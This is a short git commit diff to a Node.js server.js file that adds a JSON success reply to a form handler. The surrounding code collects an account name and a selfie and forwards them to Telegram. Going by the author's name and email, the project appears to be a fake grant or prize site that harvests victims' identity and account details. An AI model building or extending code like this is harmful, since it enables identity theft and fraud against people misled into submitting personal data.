eb40f8e3398a8c10688034a2d44e33676a95659e
govgranter <luckyiphonegrab@gmail.com>
2025-10-18 23:35:45 +0100

    Update server.js

--- server.js
+++ server.js
@@ -154,6 +154,11 @@ const accountNameLine = accountName ? `<b>Account Name:</b> ${accountName}` : ''
         // Send selfie to Telegram with a caption if there is one
         const caption = `📸 Selfie from: ${name}`;
         sendPhotoToTelegram(selfieFile.path, caption);
+    
+    res.json({ 
+            success: true, 
+            message: 'Form submitted and data sent to Telegram successfully' 
+        });
 
 });
 
